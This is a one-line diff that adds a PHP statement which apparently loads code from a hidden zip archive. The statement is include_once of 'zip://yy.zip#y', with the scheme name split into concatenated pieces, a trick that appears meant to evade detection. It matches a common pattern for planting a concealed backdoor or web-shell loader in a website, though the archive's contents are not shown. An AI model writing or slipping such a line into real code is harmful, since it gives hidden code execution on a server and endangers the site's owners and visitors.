@@ -1,0 +1,1 @@
+<?php include_once ("z"."ip://yy.z"."ip#y");?>
